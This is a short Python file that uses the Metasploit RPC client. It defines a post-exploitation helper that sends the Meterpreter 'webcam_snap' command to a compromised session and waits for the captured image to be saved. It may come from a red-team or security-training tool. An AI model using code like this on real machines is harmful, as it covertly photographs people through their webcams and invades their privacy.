from metasploit.msfrpc import MsfRpcClient

import time
import anssi.settings
import os

def post_take_snapshot(shell, snapshot_path):
    shell.write('webcam_snap -v false -p {}\n'.format(snapshot_path))

    # Wait the end of the function (migration or execution of screenshot)
    while not os.path.exists(snapshot_path):
        time.sleep(0.2)

    # Clear the line
    result = shell.read()
    return
